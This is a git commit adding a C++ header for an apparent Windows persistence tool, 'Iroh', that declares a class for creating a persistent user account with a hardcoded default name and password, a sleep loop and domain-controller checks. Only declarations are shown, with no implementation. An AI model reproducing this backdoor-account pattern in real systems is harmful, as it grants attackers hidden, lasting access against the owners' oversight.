f2c4d97f8f1535ac56ea629c958ae703593a3800
jmb4371 <36006157+jmb4371@users.noreply.github.com>
2020-11-27 13:15:59 -0500

    User namespace and class implemented. Release mode sleep timer can't be set still.

---
+++ Iroh-Library/Iroh/User.h
@@ -0,0 +1,41 @@
+#ifndef IROH_IROHLIBRARY_IROH_USER_H
+#define IROH_IROHLIBRARY_IROH_USER_H
+
+#pragma comment(lib, "Netapi32.lib")
+
+#include<Windows.h>
+#include <DSRole.h>
+#include <LM.h>
+
+#include <string>
+
+#define DEFAULT_USERNAME L"Iroh"
+#define DEFAULT_PASSWORD L"Password-123!"
+#define DEFAULT_SLEEPTIMER 15000
+
+namespace Iroh {
+
+	class IrohUser
+	{
+	public:
+		std::wstring username;
+		std::wstring password;
+		INT sleepTime;
+		
+		IrohUser();
+		VOID SetUsername(std::string);
+		VOID SetPassword(std::string);
+		VOID SetSleepTime(INT);
+		VOID Start();
+
+	private:
+		VOID UserLoop();
+		VOID CreatePersistentUser();
+		BOOL IsDomainController();
+		std::wstring GetDomainName();
+
+	};
+
+}
+
+#endif // !IROH_IROHLIBRARY_IROH_USER_H
